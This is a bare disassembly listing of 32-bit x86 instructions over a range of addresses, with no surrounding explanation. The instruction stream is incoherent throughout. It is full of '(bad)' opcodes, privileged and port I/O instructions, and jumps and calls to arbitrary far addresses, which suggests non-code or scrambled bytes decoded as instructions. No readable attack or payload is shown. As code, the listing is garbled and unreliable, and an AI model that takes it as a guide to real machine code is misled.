  421efa:	mov    edx,0x978d2c69
  421eff:	jb     0x421f39
  421f01:	sub    ebp,esp
  421f03:	pushf  
  421f04:	mov    cl,0xb2
  421f06:	adc    DWORD PTR [ecx+0x1ef5e878],ebx
  421f0c:	loopne 0x421f82
  421f0e:	repz jo 0x421f6f
  421f11:	cmp    eax,0x8192fa24
  421f16:	ins    BYTE PTR es:[edi],dx
  421f17:	test   ecx,esp
  421f19:	ss pop ebx
  421f1b:	ret    
  421f1c:	or     eax,eax
  421f1e:	adc    BYTE PTR [esp+eiz*8],dh
  421f21:	lahf   
  421f22:	in     al,0xed
  421f24:	mov    al,ds:0xcf029af0
  421f29:	mov    ds:0x41d952a6,eax
  421f2e:	or     esp,DWORD PTR [ebx]
  421f30:	pop    ss
  421f31:	cmp    eax,0x36dc4d9a
  421f36:	jmp    0x421f8b
  421f38:	test   eax,0x121a92db
  421f3d:	or     DWORD PTR [ebx],ecx
  421f3f:	xor    eax,0xb7a820ad
  421f44:	push   es
  421f45:	jecxz  0x421f2f
  421f47:	xor    esi,DWORD PTR cs:[ebp+eiz*8+0x4e30925f]
  421f4f:	in     eax,dx
  421f50:	jno    0x421f5e
  421f52:	or     ebp,edi
  421f54:	add    dl,dl
  421f56:	out    0xd2,al
  421f58:	shr    DWORD PTR [eax+0x40],cl
  421f5b:	lods   al,BYTE PTR ds:[esi]
  421f5c:	push   esp
  421f5d:	jl     0x421f58
  421f5f:	cdq    
  421f60:	cwde   
  421f61:	std    
  421f62:	add    eax,0x58f89148
  421f67:	add    edx,DWORD PTR [edx-0x1e]
  421f6a:	sub    BYTE PTR [ebx+0x57],ah
  421f6d:	mov    ah,0xd8
  421f6f:	loope  0x421fd0
  421f71:	mov    bl,0x93
  421f73:	rol    ebp,cl
  421f75:	int3   
  421f76:	jmp    0x3db9f2b0
  421f7b:	and    bh,BYTE PTR [ecx-0x65]
  421f7e:	or     eax,0x939e180a
  421f83:	push   es
  421f84:	push   ebx
  421f85:	push   esi
  421f86:	mov    ch,BYTE PTR [edi+0x71aeeab2]
  421f8c:	mov    cl,0x78
  421f8e:	mov    BYTE PTR [ebx+0x6bcc3233],ah
  421f94:	cmp    edx,DWORD PTR [ebp-0x500e8f75]
  421f9a:	mov    esi,?
  421f9c:	jmp    0x2a34:0x7ccd49a2
  421fa3:	imul   ecx,eax,0x526eaaa7
  421fa9:	push   edi
  421faa:	add    al,0x45
  421fac:	sbb    bh,ah
  421fae:	loop   0x422001
  421fb0:	xor    dh,bl
  421fb2:	scas   eax,DWORD PTR es:[edi]
  421fb3:	push   edi
  421fb4:	imul   edi,edx,0x871066e7
  421fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fbb:	aam    0x11
  421fbd:	stos   BYTE PTR es:[edi],al
  421fbe:	psubsw mm4,QWORD PTR [esp+edx*2]
  421fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fc3:	dec    edi
  421fc4:	popa   
  421fc5:	scas   al,BYTE PTR es:[edi]
  421fc6:	stc    
  421fc7:	int3   
  421fc8:	popa   
  421fc9:	sti    
  421fca:	pusha  
  421fcb:	popa   
  421fcc:	mov    al,ds:0xb5cb1274
  421fd1:	push   esi
  421fd2:	dec    edi
  421fd3:	imul   edi,DWORD PTR [eax+eiz*4-0x3bddaff0],0x87336fbb
  421fde:	dec    eax
  421fdf:	sbb    BYTE PTR [edi-0x13bd2944],dh
  421fe5:	push   ecx
  421fe6:	out    dx,al
  421fe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fe8:	jb     0x421fc7
  421fea:	dec    edi
  421feb:	clc    
  421fec:	jle    0x421fdf
  421fee:	xchg   edx,eax
  421fef:	mov    ecx,0x983835c2
  421ff4:	sub    eax,0x91e7dfd0
  421ff9:	add    eax,0xeeba9400
  421ffe:	test   eax,0x7cc8ffb4
  422003:	push   edi
  422004:	stos   DWORD PTR es:[edi],eax
  422005:	ds repnz add DWORD PTR cs:[edx-0x4c],esi
  42200b:	popf   
  42200c:	ins    BYTE PTR es:[edi],dx
  42200d:	pop    eax
  42200e:	retf   
  42200f:	jo     0x42207f
  422011:	bound  ecx,QWORD PTR [esi+ecx*8]
  422014:	dec    ebp
  422015:	sbb    ebx,DWORD PTR [esi-0x77]
  422018:	mov    ds,WORD PTR [ebx+0x46]
  42201b:	inc    edi
  42201c:	sub    ebp,DWORD PTR [ebp+0x5d0ec4cd]
  422022:	sbb    al,0x45
  422024:	nop
  422025:	dec    esp
  422026:	popa   
  422027:	and    esp,edi
  422029:	sbb    edi,DWORD PTR ds:0x3eb3ecc3
  42202f:	(bad)  [edx]
  422031:	mov    ebp,0xe5814c62
  422036:	mov    esi,0xaca5517c
  42203b:	jae    0x422010
  42203d:	repnz lock dec edi
  422040:	push   esp
  422041:	adc    BYTE PTR [eax],ch
  422043:	aaa    
  422044:	mov    esi,0x630fc145
  422049:	popf   
  42204a:	adc    eax,0xf9769bfe
  42204f:	dec    edi
  422050:	pop    edx
  422051:	in     al,0xa3
  422053:	jle    0x422083
  422055:	xor    edi,ebp
  422057:	push   edi
  422058:	add    DWORD PTR [ebx+0xf],edx
  42205b:	jmp    0x11d:0x49fd543c
  422062:	dec    ebp
  422063:	daa    
  422064:	push   eax
  422065:	xor    BYTE PTR [esi+0xf],ah
  422068:	push   edx
  422069:	jl     0x42202a
  42206b:	mov    edx,0x6a76b86c
  422070:	ret    
  422071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422072:	add    al,0x9
  422074:	cmp    bh,al
  422076:	iret   
  422077:	fbld   TBYTE PTR [ecx]
  422079:	inc    ebx
  42207a:	adc    DWORD PTR [esi],0x7e
  42207d:	jp     0x4220e3
  42207f:	lock sub eax,edi
  422082:	test   bl,0xa
  422085:	leave  
  422086:	nop
  422087:	sbb    edi,DWORD PTR [ebx+0x1e]
  42208a:	sbb    eax,0xad678067
  42208f:	shl    DWORD PTR [esi],cl
  422091:	add    eax,0xda82a5e3
  422096:	(bad)  
  422097:	pop    ecx
  422098:	out    dx,eax
  422099:	or     eax,0xbf28e937
  42209e:	jp     0x4220ed
  4220a0:	repz xor bh,dh
  4220a3:	jo     0x4220fd
  4220a5:	and    dh,al
  4220a7:	push   ecx
  4220a8:	lods   al,BYTE PTR ds:[esi]
  4220a9:	inc    edi
  4220aa:	sbb    bh,cl
  4220ac:	jbe    0x4220f6
  4220ae:	lods   al,BYTE PTR ds:[esi]
  4220af:	add    DWORD PTR [edi+0x71],esp
  4220b2:	fnsave [esp+ebp*8]
  4220b5:	or     esi,eax
  4220b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220b8:	mov    edi,0x84f441cc
  4220bd:	(bad)
  4220c1:	call   0x39e7:0x1bc7b9f3
  4220c8:	dec    eax
  4220c9:	clc    
  4220ca:	test   eax,0xe97e976a
  4220cf:	lahf   
  4220d0:	add    al,0xa5
  4220d2:	and    al,0x5b
  4220d4:	or     DWORD PTR [edx-0x203a482c],esi
  4220da:	pusha  
  4220db:	inc    edx
  4220dc:	xor    DWORD PTR fs:[edx],esi
  4220df:	icebp  
  4220e0:	or     ebp,ebp
  4220e2:	and    BYTE PTR [eax],bl
  4220e4:	push   edx
  4220e5:	es pop ds
  4220e7:	mov    ?,WORD PTR [edx+0x26]
  4220ea:	ror    BYTE PTR [edx+0x72],0x44
  4220ee:	and    BYTE PTR [edx],ah
  4220f0:	sbb    ebx,DWORD PTR [ebp+esi*8-0x60a4e103]
  4220f7:	mov    BYTE PTR [ecx],0x87
  4220fa:	cmp    eax,0xcdcabb81
  4220ff:	fst    DWORD PTR [edx-0x320b4f52]
  422105:	ret    
  422106:	daa    
  422107:	sub    al,0xc
  422109:	inc    esi
  42210a:	loope  0x422112
  42210c:	ins    BYTE PTR es:[edi],dx
  42210d:	lahf   
  42210e:	aaa    
  42210f:	daa    
  422110:	mov    esp,0xdf074507
  422115:	mov    bh,dl
  422117:	xchg   edi,eax
  422118:	xchg   ecx,eax
  422119:	iret   
  42211a:	sub    BYTE PTR [esi],dl
  42211c:	xor    eax,0xf4dccb30
  422121:	push   eax
  422122:	sbb    bh,BYTE PTR [ebp+0x3]
  422125:	(bad)  
  422127:	adc    dl,BYTE PTR [eax]
  422129:	lods   al,BYTE PTR ds:[esi]
  42212a:	jmp    0x42215a
  42212c:	clc    
  42212d:	mov    WORD PTR [ecx],dx
  422130:	call   0x705f:0xbe2e06f2
  422137:	test   bh,cl
  422139:	enter  0x76cd,0xd8
  42213d:	dec    edi
  42213e:	loope  0x422112
  422140:	push   ebx
  422141:	es aas 
  422143:	or     DWORD PTR [edx],eax
  422145:	mov    al,ds:0xaa9d27da
  42214a:	es push ds
  42214c:	jnp    0x42215b
  42214e:	daa    
  42214f:	push   ebx
  422150:	imul   ebx,DWORD PTR [eax-0x3c],0x78
  422154:	adc    eax,0xd9281f68
  422159:	sub    DWORD PTR [ebx],ecx
  42215b:	test   BYTE PTR [ebx],dh
  42215d:	les    esp,FWORD PTR [ebp+0x6e]
  422160:	fxch   st(1)
  422162:	push   edi
  422163:	adc    DWORD PTR [ebx],esp
  422165:	std    
  422166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422167:	sbb    eax,DWORD PTR [esi-0x37c72ec]
  42216d:	lahf   
  42216e:	stc    
  42216f:	cmp    ah,BYTE PTR [ebx]
  422171:	sahf   
  422172:	sti    
  422173:	jns    0x4221b2
  422175:	into   
  422176:	or     BYTE PTR fs:[esi-0x29],0x10
  42217b:	out    0x4f,al
  42217d:	retf   0xa1f8
  422180:	pushf  
  422181:	pop    esi
  422182:	jbe    0x4221b9
  422184:	(bad)  
  422185:	icebp  
  422186:	dec    edi
  422187:	mov    eax,0x4ee1d3b5
  42218c:	dec    edi
  42218d:	(bad)  
  42218e:	scas   eax,DWORD PTR es:[edi]
  42218f:	(bad)  
  422190:	lods   eax,DWORD PTR ds:[esi]
  422191:	int3   
  422192:	imul   ebx,DWORD PTR [esi+0x51557328],0x5f9f8c98
  42219c:	or     ah,cl
  42219e:	das    
  42219f:	rcr    DWORD PTR [ecx+0x470759e6],0x24
  4221a6:	lahf   
  4221a7:	dec    esp
  4221a8:	cs jecxz 0x4221a9
  4221ab:	mov    eax,ds:0x8cd1b9ef
  4221b0:	or     BYTE PTR [edx-0x264f880e],bh
  4221b6:	xchg   ebx,eax
  4221b7:	dec    edx
  4221b8:	je     0x422151
  4221ba:	inc    edi
  4221bb:	cs in  al,0x29
  4221be:	mov    cl,0xc8
  4221c0:	icebp  
  4221c1:	mov    DWORD PTR [esi+0x5c8ab41f],esi
  4221c7:	jae    0x42218c
  4221c9:	inc    edi
  4221ca:	repz fisub DWORD PTR [eax-0x38c987b7]
  4221d1:	mov    BYTE PTR [edi],al
  4221d3:	bound  ebx,QWORD PTR [eax+0x403462b4]
  4221d9:	push   ecx
  4221da:	inc    esp
  4221db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221dc:	dec    ecx
  4221dd:	outs   dx,DWORD PTR ds:[esi]
  4221de:	add    al,0x40
  4221e0:	leave  
  4221e1:	sub    eax,0x6e5b5bd5
  4221e6:	fs (bad) 
  4221e8:	aam    0x62
  4221ea:	lahf   
  4221eb:	add    eax,0xc204fb29
  4221f0:	fs loopne 0x4221a2
  4221f3:	jmp    0x42217c
  4221f5:	fdiv   st(3),st
  4221f7:	jo     0x4221cc
  4221f9:	cmp    eax,DWORD PTR [eax-0x45a2180]
  4221ff:	cmp    cl,BYTE PTR [ebp-0x7cab87ee]
  422205:	lea    ecx,[edi]
  422207:	in     al,0x30
  422209:	cli    
  42220a:	fnstenv [edx-0x20af1737]
  422210:	mov    eax,cr6
  422213:	test   al,0x9e
  422215:	push   es
  422216:	pop    ds
  422217:	pop    ds
  422218:	xchg   ebp,eax
  422219:	xor    BYTE PTR [edx-0x5f],ah
  42221c:	push   ecx
  42221d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42221e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42221f:	cwde   
  422220:	out    dx,al
  422221:	sti    
  422222:	vmwrite edi,ebp
  422225:	sbb    ch,bh
  422227:	xchg   esp,eax
  422228:	dec    ebp
  422229:	push   eax
  42222a:	add    al,0xe
  42222c:	aas    
  42222d:	into   
  42222e:	adc    ecx,ebp
  422230:	sub    eax,0xa3921870
  422235:	loop   0x4222a9
  422237:	daa    
  422238:	ins    DWORD PTR es:[edi],dx
  422239:	aaa    
  42223a:	pop    ecx
  42223b:	inc    esi
  42223c:	mov    ds,WORD PTR [esi]
  42223e:	clc    
  42223f:	and    bl,BYTE PTR [esi-0x79]
  422242:	fisttp DWORD PTR [ebp+0x31b8bc21]
  422248:	and    al,0xbd
  42224a:	test   BYTE PTR [ebx+0xf03eca8],al
  422250:	mov    al,ds:0xc79dad71
  422255:	pop    edi
  422256:	pop    edi
  422257:	jmp    0x42225e
  422259:	clc    
  42225a:	dec    ecx
  42225b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42225c:	mov    esp,ecx
  42225e:	cmp    bl,BYTE PTR [edi]
  422260:	addr16 adc edi,ebx
  422263:	shl    BYTE PTR [ebp-0x40b97e93],0x10
  42226a:	jge    0x422266
  42226c:	fisubr WORD PTR [esi+ecx*8-0x18c5740]
  422273:	push   ss
  422274:	inc    ecx
  422275:	jae    0x4222a0
  422277:	push   esi
  422278:	jb     0x42226c
  42227a:	xor    bl,BYTE PTR [ebp+0x2b]
  42227d:	mov    bl,0xa7
  42227f:	test   DWORD PTR [ebp+0x6fe64a7b],0x83eaa4e
  422289:	sbb    dh,BYTE PTR [ebp+0x4365a7de]
  42228f:	popf   
  422290:	or     BYTE PTR [eax+0x6d],dh
  422293:	mov    dh,0xc8
  422296:	or     al,0xe7
  422298:	sub    al,0x6d
  42229a:	xchg   edi,eax
  42229b:	push   ebp
  42229c:	mov    eax,ds:0xc466f01c
  4222a1:	sar    ebx,0x1a
  4222a4:	retf   0xb4b4
  4222a7:	cmp    DWORD PTR [edx-0x1d],esp
  4222aa:	std    
  4222ab:	adc    eax,0xd0cf0ee9
  4222b0:	ror    DWORD PTR [edi-0x7597f],cl
  4222b6:	sbb    eax,0xd7c8eaf0
  4222bb:	sahf   
  4222bc:	xor    ax,0x9298
  4222c0:	pop    esp
  4222c1:	or     BYTE PTR [edx],0x63
  4222c4:	or     bl,dl
  4222c6:	(bad)  
  4222c8:	pop    ss
  4222c9:	fisub  DWORD PTR [edx+0x41]
  4222cc:	dec    esi
  4222cd:	test   al,0x76
  4222cf:	jge    0x422271
  4222d1:	sub    DWORD PTR [eax-0x5891bc72],ebp
  4222d7:	stos   BYTE PTR es:[edi],al
  4222d8:	or     DWORD PTR [ecx+0x40dc464f],esi
  4222de:	cmp    eax,0x8b3d157e
  4222e3:	repnz sbb DWORD PTR [ebx+edi*2],eax
  4222e7:	ds push esp
  4222e9:	add    dl,cl
  4222eb:	pusha  
  4222ec:	retf   
  4222ed:	sbb    al,0xb7
  4222ef:	sbb    al,0x79
  4222f1:	sahf   
  4222f2:	test   eax,0x83ad74d2
  4222f7:	mov    dl,0xf1
  4222f9:	sub    ebp,esi
  4222fb:	popf   
  4222fc:	add    eax,0x7da784cb
  422301:	ror    DWORD PTR [eax],0x4f
  422304:	adc    eax,0x16dc264b
  422309:	in     al,0x76
  42230b:	pop    esi
  42230c:	jle    0x422367
  42230e:	mov    esp,0x3eb46821
  422313:	mov    bl,0x76
  422315:	jecxz  0x42229b
  422317:	jae    0x42235d
  422319:	cmc    
  42231a:	fstp   TBYTE PTR [esi+0x673fce0f]
  422320:	jnp    0x42235d
  422322:	and    ah,BYTE PTR [ecx+0x499945c9]
  422328:	fnsave [esi-0x35]
  42232b:	push   es
  42232c:	jge    0x4222e3
  42232e:	add    eax,0x218c0528
  422333:	ja     0x4222f6
  422335:	xor    ecx,DWORD PTR [esi+esi*1-0x53bc7fa0]
  42233c:	imul   ecx,DWORD PTR [ebp-0x93297db],0xa27eb596
  422346:	leave  
  422347:	fnsave [eax-0x54]
  42234a:	push   ecx
  42234b:	ds push 0xffffff91
  42234e:	sub    al,BYTE PTR [ecx-0x33d29df0]
  422354:	mov    edx,0xaff22b9a
  422359:	inc    eax
  42235a:	aaa    
  42235b:	xchg   ebp,eax
  42235c:	mov    eax,ds:0xa14fa654
  422361:	sbb    eax,0x33a5f742
  422366:	psubq  mm5,QWORD PTR [ebx-0x23]
  42236a:	mov    BYTE PTR ss:[eax+0x5],cl
  42236e:	(bad)  
  42236f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422370:	rcl    DWORD PTR [edi+edx*2+0x6d],1
  422374:	mov    ah,0x9
  422376:	aas    
  422377:	sbb    esi,ebx
  422379:	ja     0x4223d4
  42237b:	dec    ebp
  42237c:	arpl   WORD PTR [ebp-0x39],cx
  42237f:	xchg   ebx,edi
  422381:	sub    dl,al
  422383:	and    al,0xe5
  422385:	(bad)  
  422386:	sti    
  422387:	add    eax,0xb2007915
  42238c:	fwait
  42238d:	lds    esp,FWORD PTR [edx]
  42238f:	loopne 0x4223bc
  422391:	hlt    
  422392:	mov    dl,0xd8
  422394:	jl     0x4223fd
  422396:	fistp  WORD PTR [bp+si-0x1b32]
  42239b:	js     0x422390
  42239d:	sub    ah,ch
  42239f:	add    cl,BYTE PTR [edi+0x2ae7c87e]
  4223a5:	cwde   
  4223a6:	sub    BYTE PTR [ebp-0x1c],dl
  4223a9:	push   0xffffff9c
  4223ab:	pushf  
  4223ac:	cmp    eax,0x8d0b9b23
  4223b1:	sbb    eax,0x3017d18e
  4223b6:	iret   
  4223b7:	sub    BYTE PTR [ebx],0xa0
  4223ba:	pop    edi
  4223bb:	xchg   ecx,eax
  4223bc:	mov    edx,0xf7cf78f6
  4223c1:	mov    ds:0xe46665f2,eax
  4223c6:	xchg   ebp,eax
  4223c7:	adc    ecx,DWORD PTR [ecx+0x3e]
  4223ca:	loope  0x422405
  4223cc:	rcr    edi,cl
  4223ce:	mov    eax,ds:0xf362016e
  4223d3:	pop    ss
  4223d4:	inc    DWORD PTR [ecx-0x5d]
  4223d7:	fwait
  4223d8:	adc    eax,DWORD PTR [ecx-0x69]
  4223db:	js     0x4223c4
  4223dd:	inc    ebx
  4223de:	push   esi
  4223df:	in     al,dx
  4223e0:	mov    edi,0x955d49a9
  4223e5:	rcr    DWORD PTR [ebx+0x1],1
  4223e8:	cmc    
  4223e9:	push   0x57
  4223eb:	js     0x422425
  4223ed:	xor    BYTE PTR [esp+eax*4-0x29044d66],cl
  4223f4:	int    0xa7
  4223f6:	lock sar BYTE PTR [ebx-0x54aa52a2],1
  4223fd:	inc    edi
  4223fe:	pop    edi
  4223ff:	repnz sbb DWORD PTR [ecx+ebp*8-0x208c55c7],ebp
  422407:	(bad)  
  422409:	mov    dl,0xc4
  42240b:	test   eax,0xbedd9fa6
  422410:	xor    eax,0x8fb9fd44
  422415:	call   0x9bcf:0xcb3b48d6
  42241c:	mov    BYTE PTR [eax-0x9738ca8],cl
  422422:	jmp    0x4d6fd0e5
  422427:	add    eax,0x92897cb5
  42242c:	leave  
  42242d:	sub    BYTE PTR [ebx-0x5f],ch
  422430:	mul    BYTE PTR [edx-0x28688c10]
  422436:	jmp    0xc36eb5d9
  42243b:	fmul   QWORD PTR [esi+0x3b]
  42243e:	cmp    eax,0xa2dd0318
  422443:	sbb    eax,0xfeac9ecc
  422448:	inc    eax
  422449:	scas   eax,DWORD PTR es:[edi]
  42244a:	ins    BYTE PTR es:[edi],dx
  42244b:	test   DWORD PTR [ecx+0x7ec4785c],edx
  422451:	adc    bh,BYTE PTR [esi-0x5d5ce6e6]
  422457:	enter  0x3452,0xff
  42245b:	pop    ebx
  42245c:	aaa    
  42245d:	push   edi
  42245e:	not    BYTE PTR [ebp+0x69e4bf0f]
  422464:	retf   
  422465:	imul   esi,DWORD PTR [edi-0x2626fab0],0x30
  42246c:	clc    
  42246d:	test   BYTE PTR [ecx],0x1c
  422470:	loopne 0x4224b4
  422472:	stos   DWORD PTR es:[edi],eax
  422473:	shl    DWORD PTR [ebp+0x39],0x88
  422477:	(bad)
  42247a:	pop    esp
  42247b:	gs adc dh,dh
  42247e:	pop    ds
  42247f:	ficomp WORD PTR [ecx+0x27]
  422482:	ret    0xa6a4
  422485:	rol    BYTE PTR [ebx+esi*2-0x64],1
  422489:	stos   DWORD PTR es:[edi],eax
  42248a:	add    ch,ah
  42248c:	xchg   DWORD PTR [esi],ebp
  42248e:	clc    
  42248f:	(bad)  
  422491:	mov    al,ds:0xb1137a2b
  422496:	xor    esp,edx
  422498:	and    ebp,esp
  42249a:	cli    
  42249b:	inc    ebx
  42249c:	xchg   esi,eax
  42249d:	pop    edx
  42249e:	add    eax,0xef411797
  4224a3:	pushf  
  4224a4:	push   ebx
  4224a5:	adc    al,0x0
  4224a7:	aam    0x2b
  4224a9:	shl    BYTE PTR [edi+esi*2],0xd6
  4224ad:	mov    esp,DWORD PTR [ecx+0x28fe67dd]
  4224b3:	cmp    eax,DWORD PTR [ebx-0x36]
  4224b6:	out    0x8e,eax
  4224b8:	mov    al,cs:0x2142e1ca
  4224be:	iret   
  4224bf:	pop    ecx
  4224c0:	jmp    0x99765e4f
  4224c5:	arpl   di,bp
  4224c7:	add    ah,BYTE PTR [esi-0x41]
  4224ca:	xlat   BYTE PTR ds:[ebx]
  4224cb:	xor    edx,DWORD PTR ds:0x7292b807
  4224d1:	and    al,0x25
  4224d3:	push   ebx
  4224d4:	pop    esi
  4224d5:	dec    DWORD PTR [eax-0x6a]
  4224d8:	(bad)  
  4224d9:	mov    al,ds:0xbd34b1c5
  4224de:	pop    ebx
  4224df:	push   esi
  4224e0:	sahf   
  4224e1:	cmp    bh,BYTE PTR [ebx+0x6b6cee0]
  4224e7:	cmp    eax,0xea271483
  4224ec:	dec    esi
  4224ed:	pop    ss
  4224ee:	ja     0x422567
  4224f0:	dec    ebp
  4224f1:	mov    ebp,0xd6f58684
  4224f6:	dec    eax
  4224f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224f8:	sub    al,0x80
  4224fa:	cmp    ah,bl
  4224fc:	dec    ebx
  4224fd:	scas   eax,DWORD PTR es:[edi]
  4224fe:	ins    DWORD PTR es:[edi],dx
  4224ff:	test   al,0x67
  422501:	icebp  
  422502:	in     al,0x76
  422504:	mov    ecx,ebx
  422506:	xchg   esp,edi
  422508:	mov    WORD PTR [ebx+0x53],cs
  42250b:	arpl   WORD PTR [eax-0x25],bp
  42250e:	cmp    edx,DWORD PTR [ebx-0x3e]
  422511:	fwait
  422512:	sahf   
  422513:	sub    edi,DWORD PTR [eax+0x15]
  422516:	mov    eax,0x58982bca
  42251b:	rcr    BYTE PTR [eax-0x3e],0x4a
  42251f:	add    al,0x7e
  422521:	stos   DWORD PTR es:[edi],eax
  422522:	sti    
  422523:	mov    bh,0x96
  422525:	call   0x3445a67f
  42252a:	ds in  eax,0xed
  42252d:	jns    0x4224f0
  42252f:	sbb    DWORD PTR [ebp+esi*4+0x20],ebp
  422533:	(bad)  
  422535:	mul    DWORD PTR [ebx-0x70]
  422538:	push   ds
  422539:	jl     0x422505
  42253b:	inc    edi
  42253c:	(bad)  
  42253d:	dec    ebp
  42253e:	pop    ecx
  42253f:	(bad)  
  422541:	retf   0x504f
  422544:	les    edi,FWORD PTR cs:[ebx+0x38]
  422548:	cld    
  422549:	add    dh,BYTE PTR [esi+0x2cefe7b3]
  42254f:	scas   al,BYTE PTR es:[edi]
  422550:	mov    eax,ds:0xe33a29c4
  422555:	call   0xf47c7722
  42255a:	lock ja 0x42250e
  42255d:	enter  0x4f78,0xc6
  422561:	push   cs
  422562:	sub    DWORD PTR [edi+0x24],ebx
  422565:	bound  esi,QWORD PTR [edi+0x5]
  422568:	mov    WORD PTR [esi+0xf],ds
  42256b:	test   al,0xe4
  42256d:	cmp    ah,bl
  42256f:	fidivr WORD PTR [ecx]
  422571:	test   al,0x80
  422573:	push   ebx
  422574:	cdq    
  422575:	fldcw  WORD PTR [edi-0x2d36a066]
  42257b:	inc    ebp
  42257c:	pusha  
  42257d:	mov    cl,0x35
  42257f:	iret   
  422580:	stos   BYTE PTR es:[edi],al
  422581:	jb     0x4225d4
  422583:	fdivr  DWORD PTR [ecx+edi*1+0x1a8739e3]
  42258a:	jnp    0x422557
  42258c:	mov    dh,0xe3
  42258e:	je     0x422550
  422590:	jae    0x422589
  422592:	sbb    BYTE PTR cs:[edi],bh
  422595:	outs   dx,BYTE PTR ds:[esi]
  422596:	fadd   QWORD PTR ds:0x90bcb00a
  42259c:	push   ds
  42259d:	inc    edx
  42259e:	aad    0x51
  4225a0:	jbe    0x4225f4
  4225a2:	pop    esi
  4225a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225a4:	cwde   
  4225a5:	mov    ebx,0x56f8672a
  4225aa:	push   edi
  4225ab:	rcr    bl,cl
  4225ad:	lds    ecx,FWORD PTR [eax]
  4225af:	jb     0x4225c7
  4225b1:	(bad)  
  4225b2:	cmp    al,BYTE PTR [eax]
  4225b4:	add    ah,BYTE PTR [esi+0x39]
  4225b7:	xchg   ecx,eax
  4225b8:	jbe    0x4225e5
  4225ba:	call   0xbe45e80c
  4225bf:	stos   DWORD PTR es:[edi],eax
  4225c0:	hlt    
  4225c1:	sub    dh,BYTE PTR [edi+0x5f86df0b]
  4225c7:	sub    BYTE PTR [esi-0x4f49c8d0],0x8a
  4225ce:	xchg   DWORD PTR [eax-0x5ebe3f85],ebx
  4225d4:	ins    DWORD PTR es:[edi],dx
  4225d5:	not    DWORD PTR [edx-0x5fba8bb7]
  4225db:	xchg   edi,eax
  4225dc:	lock outs dx,DWORD PTR ds:[esi]
  4225de:	mov    al,0x31
  4225e0:	test   eax,0x15300c8a
  4225e5:	stos   DWORD PTR es:[edi],eax
  4225e6:	test   DWORD PTR [edi-0x6b],edi
  4225e9:	retf   
  4225ea:	hlt    
  4225eb:	test   al,0x6b
  4225ed:	push   ds
  4225ee:	hlt    
  4225ef:	dec    eax
  4225f0:	mov    esp,0xd6b43722
  4225f5:	int    0x34
  4225f7:	retf   
  4225f8:	pop    es
  4225f9:	sbb    eax,0xba592d43
  4225fe:	push   ds
  4225ff:	cmp    al,0xb1
  422601:	jae    0x42265f
  422603:	mov    ecx,0x9da281ae
  422608:	imul   esi,ebx,0x6f34ce4d
  42260e:	loopne 0x422627
  422610:	sbb    eax,0x251f8d7e
  422615:	popa   
  422616:	push   0x75
  422618:	dec    eax
  422619:	daa    
  42261a:	cmp    esi,ebp
  42261c:	aad    0xf8
  42261e:	add    eax,0x4a836ea9
  422623:	cdq    
  422624:	int    0xbe
  422626:	jge    0x422684
  422628:	cwde   
  422629:	jmp    0x422631
  42262b:	and    al,0xb4
  42262d:	inc    esp
  42262e:	daa    
  42262f:	test   BYTE PTR [edi-0x4de4c8f2],ah
  422635:	mov    DWORD PTR [ebx-0x64e3b521],ebx
  42263b:	dec    esi
  42263c:	dec    edi
  42263d:	mov    eax,ds:0x7d2d611e
  422642:	bound  esp,QWORD PTR [ecx*1-0x75ab539a]
  422649:	pusha  
  42264a:	ret    
  42264b:	jmp    0x42260a
  42264d:	sbb    BYTE PTR [edx],cl
  42264f:	dec    esi
  422650:	repz push ecx
  422652:	stos   DWORD PTR es:[edi],eax
  422653:	jo     0x42265d
  422655:	ss xor al,0x4b
  422658:	sub    al,0x8b
  42265a:	hlt    
  42265b:	mov    esi,0xaf8c1a00
  422660:	push   es
  422661:	inc    edx
  422662:	add    eax,0xd59d6fda
  422667:	or     BYTE PTR [esi+0x2b169573],0xac
  42266e:	cmc    
  42266f:	shl    DWORD PTR [ecx],1
  422671:	cmc    
  422672:	mov    bl,BYTE PTR [edi]
  422674:	xchg   DWORD PTR [ecx],edi
  422676:	je     0x4225f9
  422678:	xchg   edi,eax
  422679:	sub    edi,ecx
  42267b:	cmp    al,0x9
  42267d:	or     BYTE PTR [eax],bl
  42267f:	jno    0x4226a1
  422681:	rcr    BYTE PTR [edi-0x4f5deeef],cl
  422687:	(bad)  
  422689:	mov    bl,0x80
  42268b:	imul   esi,DWORD PTR [edi-0x2473bff0],0x34
  422692:	dec    ecx
  422693:	adc    ebp,edx
  422695:	jno    0x422660
  422697:	inc    eax
  422698:	outs   dx,BYTE PTR ds:[esi]
  422699:	mov    eax,0x1ea5f7f7
  42269e:	pop    ebp
  42269f:	push   edx
  4226a0:	test   eax,0xb87e775f
  4226a5:	add    eax,0x801a814d
  4226aa:	sbb    ch,0xc
  4226ad:	gs mov esp,0x19a9105c
  4226b3:	les    esi,FWORD PTR [ecx]
  4226b5:	add    DWORD PTR [ebx-0x11],0x93b04d6
  4226bc:	xchg   esi,eax
  4226bd:	xchg   edi,eax
  4226be:	cmp    al,0x85
  4226c0:	daa    
  4226c1:	dec    esp
  4226c3:	adc    DWORD PTR [edi],0x4b
  4226c6:	pusha  
  4226c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c8:	mov    ah,0xa8
  4226ca:	leave  
  4226cb:	pop    ebx
  4226cc:	mov    ebp,0x6e1067f0
  4226d1:	test   eax,0x18957809
  4226d6:	repnz push 0x1f
  4226d9:	inc    BYTE PTR [esi]
  4226db:	mov    ch,0xb2
  4226dd:	jb     0x4226b3
  4226df:	mov    edi,0xbfaffe2
  4226e4:	dec    edi
  4226e5:	pop    ecx
  4226e6:	cdq    
  4226e7:	mov    ah,BYTE PTR [ecx]
  4226e9:	je     0x42274a
  4226eb:	into   
  4226ec:	pop    edx
  4226ed:	add    eax,0xf631f9af
  4226f2:	and    cl,cl
  4226f4:	mov    ch,0x2f
  4226f6:	push   ecx
